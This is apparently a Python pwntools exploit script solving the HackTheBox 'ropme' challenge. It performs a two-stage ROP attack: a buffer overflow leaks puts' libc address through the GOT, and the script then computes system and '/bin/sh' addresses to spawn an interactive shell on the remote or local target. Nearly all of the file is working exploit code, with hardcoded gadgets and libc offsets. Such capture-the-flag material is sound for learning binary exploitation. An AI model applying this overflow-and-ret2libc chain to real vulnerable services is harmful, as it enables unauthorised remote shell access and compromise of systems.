from pwn import *
import sys

context(os="linux", arch="amd64")
#context.log_level = 'DEBUG'

# ./ropme function locations
main_func     = 0x400626
puts_plt      = 0x4004e0
fgets_plt     = 0x400500
puts_got      = 0x601018
fgets_got     = 0x601028
libc_got      = 0x601020
dynamic_addr  = 0x600e28
stdin_got     = 0x601060

# remote libc offsets and gadgets
puts_offset        = 0x6f690  #0x705e0
system_libc_offset = 0x45390  #0x435d0    <--- ROPspector offsets
shell_str_offset   = 0x18cd17 #0x17f573 
#rsi_to_rdi         = 0x212ea  # <--- gadget to register holding overflow ascii
rsi_rdi_rax        = 0x865c5   # <----------ROPspector
rax_pop            = 0x39178   # <----------ROPspector
pop2_rdx_rsi       = 0x105169 #0x1150c9 # <--- ubuntu10 pop rdx; pop rsi
rax_to_rdx         = 0x11513d  #< ----- ROPspector
rsi_to_rax         = 0x4b743   #< ----- ROPspector
#                   0x0000000000105169 : pop rdx ; pop rsi ; ret


# ./ropme ROP gadgets
pop_rdi           = 0x4006d3
get_rip           = "A" * 72
pop_rsi_pop_trash = 0x4006d1

cmd = "/bin/sh\x00"

def stage1_shellcode():

    payload = get_rip
    payload += p64(pop_rdi)
    payload += p64(puts_got)  #<----was puts_got
    payload += p64(puts_plt)

    payload += p64(main_func)

    return payload

def stage2_shellcode(system_addr,shell_addr):

    payload = get_rip
    payload += p64(pop_rdi)
    payload += p64(shell_addr)
    payload += p64(system_addr)
    payload += p64(0xdeadbeefdeadbeef)
    return payload

def peda_exploit():
    argv = stage1_shellcode()
    peda.execute("set argv to %s" % argv)
    peda.execute("run")


# ------------------------- connection creation ---------------------------

log.info("Please select an option: [r]emote,[p]rocess,[h]ackthebox")
selection = raw_input("INPUT> ").rstrip()
if selection == 'h':
    port = raw_input("PORT> ")
    p = remote('docker.hackthebox.eu',port)
elif selection == 'g':
    p = gdb.debug('./ropme','b fgets')
elif selection == 'p':
    p =process('./ropme')
elif selection == 'r': 
    p = remote('127.0.0.1','9000')
else:
    log.warning("Invalid selection.")
    sys.exit()

stage1 = stage1_shellcode()

print(stage1)

# ------------------------  stage One ------------------------------------

print(p.recvuntil("dah?"))
p.sendline(stage1)
log.info("Payload deployed..")
leaked_addr = p.recvn(7)  # <--- collect leaked address

puts_real = leaked_addr[:8].strip().ljust(8,'\x00') 
log.success("Puts() real address  : %x" % u64(puts_real))

libc_real = (u64(puts_real) - puts_offset)
log.info("libc's calculated address  : %x" % libc_real)

system_real = libc_real + system_libc_offset
log.success("system() calculated address: %x" % system_real)

shell_str = libc_real + shell_str_offset # <--- libc /bin/sh str loc
log.success("/bin/sh calculated address: %x" % shell_str)

# ------------------------- stage two --------------------------------------

log.info("Beginning Stage Two")
raw_input("Press [ENTER] to deploy stage two")
stage2 = stage2_shellcode(system_real,shell_str)
print(p.recvuntil("dah?"))
log.info("Sending stage two payload....")
p.sendline(stage2)

p.interactive()

